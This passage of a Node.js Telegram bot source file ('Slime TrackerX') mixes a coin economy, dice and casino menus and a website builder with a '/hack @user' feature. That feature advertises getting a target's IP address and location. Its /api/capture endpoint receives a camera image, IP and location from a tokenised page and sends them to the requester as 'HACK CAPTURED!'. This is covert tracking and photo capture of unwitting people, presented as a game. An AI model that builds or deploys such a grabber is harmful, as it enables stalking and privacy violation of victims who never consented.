    `💀 ${u.hacks} hacks\n` +
    `🎮 ${u.wins}W/${u.losses}L (${winRate}% WR)\n` +
    `🏆 Badges: ${u.badges.join(", ")}\n` +
    `📝 Word Wins: ${u.wordWins}`);
});

bot.command("daily", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  if (u.lastDaily && now - u.lastDaily < 86400000) { 
    let h = Math.floor((86400000 - (now - u.lastDaily)) / 3600000); 
    let m = Math.floor(((86400000 - (now - u.lastDaily)) % 3600000) / 60000);
    return ctx.reply(`⏰ Next daily in ${h}h ${m}m`); 
  } 
  
  // Streak system
  let streakBonus = 0;
  if (u.lastDaily && now - u.lastDaily < 172800000) { // Within 48 hours
    u.streak = (u.streak || 0) + 1;
    streakBonus = Math.min(Math.floor(u.streak / 7) * 5, 25);
  } else {
    u.streak = 1;
  }
  
  let reward = DAILY_REWARD + streakBonus;
  await addCoin(ctx.from.id, reward);
  u.lastDaily = new Date(now);
  await saveUser(ctx.from.id, u);
  
  let streakMsg = u.streak > 1 ? `\n🔥 Streak: ${u.streak} days! +${streakBonus} bonus!` : "";
  await ctx.reply(`🎁 **DAILY REWARD** 🎁\n\n+${reward} coins!${streakMsg}`);
});

bot.command("work", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  let last = workCD.get(u.userId) || 0; 
  if (now - last < WORK_CD) { 
    let h = Math.floor((WORK_CD - (now - last)) / 3600000); 
    let m = Math.floor(((WORK_CD - (now - last)) % 3600000) / 60000);
    return ctx.reply(`⏰ Next work in ${h}h ${m}m`); 
  } 
  let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Tester", "🔧 Mechanic", "👨‍🍳 Chef", "📸 Photographer", "🎵 Musician"]; 
  let job = jobs[Math.floor(Math.random() * jobs.length)]; 
  let earnings = WORK_REWARD + Math.floor(Math.random() * 3);
  await addCoin(u.userId, earnings); 
  workCD.set(u.userId, now); 
  await ctx.reply(`💼 **WORK** 💼\n\n${job} paid you ${earnings} coins!`);
});

bot.command("redeem", async (ctx) => { 
  let args = ctx.message.text.split(" "); 
  if (args.length < 2) return ctx.reply("❌ Usage: /redeem CODE"); 
  let res = await redeemCode(ctx.from.id, args[1]); 
  await ctx.reply(res.msg); 
});

bot.command("dice", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice amount");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  
  if (roll >= 5) {
    let winAmount = bet * (roll === 6 ? 3 : 2);
    await addCoin(ctx.from.id, winAmount);
    u.wins++;
    u.games++;
    await saveUser(ctx.from.id, u);
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll}!\n🎉 WIN! +${winAmount} coins!`);
  } else {
    u.losses++;
    u.games++;
    await saveUser(ctx.from.id, u);
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll}!\n💀 LOSE! -${bet} coins`);
  }
});

// ========== HELP COMMAND ==========
bot.command("help", async (ctx) => {
  await ctx.reply(`🎮 **SLIME TRACKERX COMMANDS** 🎮\n\n` +
    `💰 **ECONOMY**\n` +
    `/balance - Check balance\n` +
    `/daily - Daily reward\n` +
    `/work - Work for coins\n` +
    `/profile - View profile\n` +
    `/leaderboard - View rankings\n\n` +
    `💀 **GAMING**\n` +
    `/hack @user - Hack someone\n` +
    `/wordbattle - Challenge someone\n` +
    `/dice [amount] - Dice game\n` +
    `/blackjack [amount] - Casino\n` +
    `/slots [amount] - Slot machine\n` +
    `/roulette [amount] [color] - Roulette\n\n` +
    `🌐 **WEB CREATOR**\n` +
    `/createweb [template] - Create website\n` +
    `/mywebsites - Your websites\n\n` +
    `🎁 **OTHER**\n` +
    `/shop - Buy items\n` +
    `/redeem [code] - Redeem code\n` +
    `/tournament - Tournaments\n` +
    `/lottery - Lottery system\n` +
    `/quests - Daily quests\n\n` +
    `🏆 Use /leaderboard to see top players!`);
});

// ========== DOPE MAIN MENU ==========
async function getMainMenu(ctx) {
  let user = await initUser(ctx.from.id);
  let menuGif = user.menuGif;
  
  const menuKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback("💀 HACK", "menu_track"), Markup.button.callback("📝 WORD BATTLE", "menu_word")],
    [Markup.button.callback("🌐 WEB CREATOR", "menu_web"), Markup.button.callback("🎰 CASINO", "menu_casino")],
    [Markup.button.callback("🎮 GAMES", "menu_games"), Markup.button.callback("💰 ECONOMY", "menu_eco")],
    [Markup.button.callback("🏆 TOURNAMENT", "menu_tournament"), Markup.button.callback("📋 QUESTS", "menu_quests")],
    [Markup.button.callback("🛒 SHOP", "menu_shop"), Markup.button.callback("👤 PROFILE", "menu_profile")],
    [Markup.button.callback("📊 LEADERBOARD", "menu_leaderboard"), Markup.button.callback("🎁 REDEEM", "menu_redeem")],
    [Markup.button.callback("🔗 REFERRAL", "menu_ref"), Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone")],
    [Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev"), Markup.button.callback("❓ HELP", "menu_help")]
  ]);
  
  if (menuGif) {
    try {
      await ctx.replyWithAnimation(menuGif, {
        caption: `🟢⚡ **SLIME TRACKERX v22.0** ⚡🟢\n\nWelcome ${ctx.from.first_name}! Choose your path:`,
        parse_mode: "Markdown",
        ...menuKeyboard
      });
      return;
    } catch(e) {}
  }
  
  return menuKeyboard;
}

// ========== ACTION HANDLERS ==========
bot.action("menu_track", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("💀 **HACK SYSTEM** 💀\n\nCost: 10 coins\nUsage: /hack @username\n\nGet their IP and location!");
});

bot.action("menu_word", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("📝 **WORD BATTLE** 📝\n\nUsage: /wordbattle @user amount difficulty\n\nDifficulties: easy (3 letters), medium (4), hard (5), expert (6)\n💰 Winner takes all coins!");
});

bot.action("menu_web", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🌐 **WEB CREATOR** 🌐\n\nCreate stunning websites for 15 coins!\n\nTemplates: portfolio, gaming, business, store, restaurant\n\n/createweb [template]\n/mywebsites");
});

bot.action("menu_casino", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🎰 **CASINO** 🎰\n\n/blackjack [amount] - Beat the dealer\n/roulette [amount] [color] - Red/black/odd/even\n/slots [amount] - Try your luck\n/lottery - Buy tickets\n\nGood luck!");
});

bot.action("menu_games", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🎮 **GAMES** 🎮\n\n/dice [amount] - Roll the dice\n/slots [amount] - Slot machine\n/wordbattle - Challenge friends\n\nCompete and win big!");
});

bot.action("menu_eco", async (ctx) => {
  await ctx.answerCbQuery();
  let u = await initUser(ctx.from.id);
  await ctx.reply(`💰 **ECONOMY** 💰\n\n` +
    `Balance: ${u.coins} coins\n` +
    `Diamonds: ${u.diamonds} 💎\n` +
    `Level: ${u.level}\n\n` +
    `/daily - ${DAILY_REWARD}+ coins\n` +
    `/work - ${WORK_REWARD}+ coins\n` +
    `/shop - Buy items`);
});

bot.action("menu_tournament", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🏆 **TOURNAMENT** 🏆\n\n/tournament list - See active tournaments\n/tournament join [id] - Join a tournament\n\nCompete against others for big prizes!");
});

bot.action("menu_quests", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("📋 **QUESTS** 📋\n\nComplete daily quests for rewards!\nUse /quests to see your progress");
});

bot.action("menu_shop", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🛒 **SHOP** 🛒\n\n/buy diamonds - 100💎 for 50 coins\n/buy ticket - Lottery ticket 5 coins\n/buy mystery - Mystery box 20 coins\n/buy xboost - 2x XP for 1 hour\n\nUse /shop for details");
});

bot.action("menu_profile", async (ctx) => {
  await ctx.answerCbQuery();
  let u = await initUser(ctx.from.id);
  let winRate = u.games > 0 ? Math.round((u.wins / u.games) * 100) : 0;
  await ctx.reply(`👤 **${u.firstName || ctx.from.first_name}**\n\n` +
    `💰 ${u.coins} coins | 💎 ${u.diamonds}\n` +
    `📊 Level ${u.level}\n` +
    `👥 ${u.referrals} referrals\n` +
    `💀 ${u.hacks} hacks\n` +
    `🎮 ${u.wins}W/${u.losses}L (${winRate}%)\n` +
    `📝 Word Wins: ${u.wordWins}\n\n` +
    `🏆 Badges: ${u.badges.join(", ")}`);
});

bot.action("menu_leaderboard", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🏆 **LEADERBOARD** 🏆\n\n/leaderboard coins - Richest users\n/leaderboard level - Highest level\n/leaderboard wins - Most wins\n/leaderboard wordwins - Word champs\n/leaderboard referrals - Top referrers\n/leaderboard hacks - Top hackers");
});

bot.action("menu_redeem", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🎁 **REDEEM CODE** 🎁\n\nUse: /redeem CODE\n\nGet codes from events and giveaways!");
});

bot.action("menu_ref", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🔗 **REFERRAL SYSTEM** 🔗\n\nInvite friends and earn ${REF_REWARD} coins per referral!\n\nYour link: ${refLink(ctx.from.id)}\n\nShare and earn!`);
});

bot.action("menu_help", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🎮 **HELP** 🎮\n\nUse /help to see all commands!\n\nJoin our channel for updates: @devxtechzone");
});

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned from using this bot!");
  
  let joined = await checkJoin(ctx);
  if (!joined) {
    return ctx.reply(`🚫 **ACCESS LOCKED** 🚫\n\nYou must join our channel to use this bot!\n\n👉 ${CHANNEL}`, {
      reply_markup: {
        inline_keyboard: [[{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }]]
      }
    });
  }
  
  // Update last active
  let user = usersCache.get(ctx.from.id);
  if (user) {
    user.lastActive = new Date();
    await saveUser(ctx.from.id, user);
  }
  
  return next();
});

// ========== START COMMAND ==========
bot.start(async (ctx) => {
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) { 
    ref = parseInt(args[1].replace("ref_", "")); 
  }
  let user = await initUser(ctx.from.id, ref);
  
  let welcomeMsg = `🟢⚡ **SLIME TRACKERX v22.0** ⚡🟢\n\n` +
    `✨ Welcome ${ctx.from.first_name}!\n` +
    `💰 ${user.coins} coins | 📊 Lvl ${user.level}\n` +
    `👥 ${user.referrals} referrals\n\n` +
    `🎯 Select a module below:`;
  
  let menuGif = user.menuGif;
  
  if (menuGif) {
    try {
      await ctx.replyWithAnimation(menuGif, {
        caption: welcomeMsg,
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("💀 HACK", "menu_track"), Markup.button.callback("📝 WORD BATTLE", "menu_word")],
          [Markup.button.callback("🌐 WEB CREATOR", "menu_web"), Markup.button.callback("🎰 CASINO", "menu_casino")],
          [Markup.button.callback("🎮 GAMES", "menu_games"), Markup.button.callback("💰 ECONOMY", "menu_eco")],
          [Markup.button.callback("🏆 TOURNAMENT", "menu_tournament"), Markup.button.callback("📋 QUESTS", "menu_quests")],
          [Markup.button.callback("🛒 SHOP", "menu_shop"), Markup.button.callback("👤 PROFILE", "menu_profile")],
          [Markup.button.callback("📊 LEADERBOARD", "menu_leaderboard"), Markup.button.callback("🎁 REDEEM", "menu_redeem")],
          [Markup.button.callback("🔗 REFERRAL", "menu_ref"), Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone")],
          [Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev"), Markup.button.callback("❓ HELP", "menu_help")]
        ])
      });
      return;
    } catch(e) {}
  }
  
  await ctx.reply(welcomeMsg, { 
    parse_mode: "Markdown",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("💀 HACK", "menu_track"), Markup.button.callback("📝 WORD BATTLE", "menu_word")],
      [Markup.button.callback("🌐 WEB CREATOR", "menu_web"), Markup.button.callback("🎰 CASINO", "menu_casino")],
      [Markup.button.callback("🎮 GAMES", "menu_games"), Markup.button.callback("💰 ECONOMY", "menu_eco")],
      [Markup.button.callback("🏆 TOURNAMENT", "menu_tournament"), Markup.button.callback("📋 QUESTS", "menu_quests")],
      [Markup.button.callback("🛒 SHOP", "menu_shop"), Markup.button.callback("👤 PROFILE", "menu_profile")],
      [Markup.button.callback("📊 LEADERBOARD", "menu_leaderboard"), Markup.button.callback("🎁 REDEEM", "menu_redeem")],
      [Markup.button.callback("🔗 REFERRAL", "menu_ref"), Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone")],
      [Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev"), Markup.button.callback("❓ HELP", "menu_help")]
    ])
  });
});

// ========== API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location } = req.body;
    if (!token || !tokens.has(token)) return res.status(400).json({ error: "Invalid" });
    let data = tokens.get(token);
    if (image) {
      let buf = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(data.chat, { source: buf }, { caption: `📸 **HACK CAPTURED!**\n\n🌐 IP: ${ip}\n📍 Location: ${location}\n🎯 Target hacked!` });
    }
    tokens.delete(token);
    res.json({ status: "success" });
  } catch(e) { res.status(500).json({ error: "Error" }); }
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  res.json({ url: `${DOMAIN}/uploads/${req.file.filename}` });
});

app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "public", "index.html")); });

// ========== TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
  if (processedMessages.has(msgId)) return;
  processedMessages.add(msgId);
  setTimeout(() => processedMessages.delete(msgId), 5000);
  
  // Web creator
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      if (build.step < build.questions.length) {
        await ctx.reply(`📝 Send your ${build.questions[build.step]}:`);
      } else {
        let html = htmlTemplates[build.template](build.data);
        let filename = `website_${ctx.from.id}_${Date.now()}.html`;
        let filepath = path.join(__dirname, "websites", filename);
        await fs.writeFile(filepath, html);
        
        await ctx.replyWithDocument({ source: filepath, filename: `${build.data[build.questions[0]] || 'website'}.html` });
        await ctx.reply(`✅ **WEBSITE CREATED!**\n\n🔗 URL: ${DOMAIN}/websites/${filename}\n👁️ Share with others!`);
        
        let website = new Website({ 
          name: build.data[build.questions[0]], 
          ownerId: ctx.from.id, 
          ownerUsername: ctx.from.username,
          template: build.template, 
          url: `${DOMAIN}/websites/${filename}` 
        });
        await website.save();
        await fs.remove(filepath);
        webBuilds.delete(ctx.from.id);
      }
    }
    return;
  }
  
  // Word challenge response
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      let isValidWord = wordsByLength[challenge.letterCount]?.includes(answer);
      
      if (isValidWord && answer.length === challenge.letterCount) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        let totalPot = challenge.bet * 2;
        await addCoin(challenge.from, totalPot);
        let user = await initUser(challenge.from);
        user.wordWins++;
        user.totalEarnedFromWords += totalPot;
        await saveUser(challenge.from, user);
        await ctx.reply(`✅ **CORRECT!** "${answer}" is valid!\n🎉 You won ${totalPot} coins!`);
        await ctx.telegram.sendMessage(challengedId, `💀 **YOU LOST!**\nThe word was "${challenge.targetWord}"\n💸 Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        let user = await initUser(challengedId);
        user.wordWins++;
        user.totalEarnedFromWords += challenge.bet * 2;
        await saveUser(challengedId, user);
        await ctx.reply(`❌ **WRONG!** "${answer}" is not a valid ${challenge.letterCount}-letter word!\n💸 You lost ${challenge.bet} coins`);
        await ctx.telegram.sendMessage(challengedId, `🎉 **YOU WIN!**\nThe word was "${challenge.targetWord}"\n💰 Won ${challenge.bet * 2} coins!`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

loadData().then(async () => {
  try {
    await bot.telegram.deleteWebhook();
    await bot.launch({ dropPendingUpdates: true });
    console.log(`🤖 SLIME TRACKERX v22.0 LIVE!`);
    console.log(`👥 Users loaded: ${usersCache.size}`);
    console.log(`🎮 Bot is ready to rock!`);
  } catch(e) {
    console.log("Error:", e.message);
  }
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
